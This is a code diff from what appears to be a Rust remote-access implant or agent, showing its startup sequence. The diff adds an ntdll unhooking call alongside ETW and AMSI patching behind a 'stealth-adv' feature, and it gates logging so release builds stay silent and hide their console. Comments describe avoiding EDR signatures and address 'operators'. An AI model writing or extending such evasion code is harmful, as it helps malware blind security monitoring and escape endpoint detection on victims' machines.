@@ -55,8 +55,19 @@ fn main() {
     #[cfg(target_os = "linux")]
     daemonize();
 
-    // 🔍 Early diagnostic check
-    let logging_enabled = std::env::var("RUST_LOG").is_ok() || cfg!(debug_assertions);
+    // Diagnostics: release ignores RUST_LOG unless AGENT_ALLOW_DIAG=1
+    let logging_enabled = {
+        let allow = std::env::var("AGENT_ALLOW_DIAG")
+            .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+            .unwrap_or(false);
+        if cfg!(debug_assertions) {
+            true
+        } else if allow {
+            std::env::var("RUST_LOG").is_ok()
+        } else {
+            false
+        }
+    };
 
     if logging_enabled {
         #[cfg(target_os = "windows")]
@@ -85,16 +96,21 @@ fn main() {
     if !logging_enabled {
         stealth::hide_console();
     } else {
-        log::info!("Stealth: hide_console() skipped due to active logging");
+        log::info!("hide_console skipped (diag mode)");
     }
 
-    // 4. Optional ETW/AMSI patches — only when built with `stealth-adv`.
-    // Default builds skip this to reduce static/behavioral signatures and avoid
-    // force-loading amsi.dll on processes that never needed it.
+    // 4. Optional ETW/AMSI — ONLY with feature stealth-adv (full profile).
+    // Default minimal/standard must NEVER enable this (high EDR signature).
     #[cfg(all(target_os = "windows", feature = "stealth-adv"))]
     {
+        let _ = stealth::unhook_ntdll();
         stealth::patch_etw();
         stealth::patch_amsi();
+    }
+    #[cfg(all(target_os = "windows", feature = "stealth-adv"))]
+    {
+        // Compile-time note for operators grepping features
+        const _: () = ();
     }
 
     // 5. COM Initialization for PTY support (dynamic resolve — no combase IAT)
